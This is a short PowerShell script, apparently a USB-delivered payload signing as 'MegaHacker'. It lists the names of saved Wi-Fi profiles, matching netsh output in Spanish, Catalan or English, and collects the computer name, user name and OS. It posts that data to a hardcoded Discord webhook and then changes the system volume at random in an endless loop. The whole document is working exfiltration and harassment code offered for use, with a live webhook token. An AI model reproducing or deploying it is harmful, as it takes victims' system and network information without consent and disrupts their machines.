$nw="**Xarxes wifi:**\r\n";
netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value;
    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
  }
  netsh wlan show profile | Select-String '(?<=Perfil de tots els usuaris\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value;
    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
  }
  netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value;
    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
  }
  $body='{"username": "MegaHacker - '+$env:USBNAME+'","avatar_url": "https://cdn.memegenerator.es/imagenes/memes/full/31/50/31505790.jpg","content": "'+$nw+'\r\n**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}';
  $bodyUTF8 = [System.Text.Encoding]::UTF8.GetBytes($body)
  
Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1170142170838216744/WSpOKi2cpXc61h0Ync6Ff8UfxwittRG2OScStJsW6f-_91kzb58WdIxHKpOHqJL8G9W9" -Method Post -Body ($bodyUTF8);

while ($true) {
    $vol = Get-Random -Minimum 0 -Maximum 100
    Set-Volume -Volume $vol
    Start-Sleep -Seconds 5
}
